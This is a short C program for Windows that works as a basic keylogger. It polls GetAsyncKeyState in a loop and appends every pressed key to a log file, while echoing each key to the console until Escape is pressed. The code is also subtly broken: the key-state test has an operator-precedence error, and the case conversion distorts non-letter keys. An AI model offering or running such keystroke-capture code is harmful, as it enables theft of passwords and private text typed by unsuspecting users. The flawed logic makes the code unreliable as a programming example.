#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

int main()
{
    printf("Hello world!\n");
    int running = 1;
    FILE *fp;

    fp = fopen("log.txt","a");
    fprintf(fp,"testing");
    int state = GetKeyState(VK_CAPITAL);
    printf("%i", state);
    while(running){
        Sleep(10);
        int state = GetKeyState(VK_CAPITAL);
        for(int ch= 8;ch<=222;ch++){

            if((GetAsyncKeyState(ch)& 0x8000!=0)){
                printf("You pressed %c ",ch);
                printf("ASCII: %i \n",ch);
                //fprintf(fp,ch);


                switch (ch){
                case 13:
                    fputs("\n",fp);
                    break;
                case 32:
                    fputc(32,fp);
                    break;
                case 27:
                    running = 0;
                    break;

                default :
                    if(state)
                        fputc(ch,fp);
                    else
                        fputc(ch+32,fp);
                    break;
                }
            }
        }
    }
    fclose(fp);
    getchar();
    return 0;
}
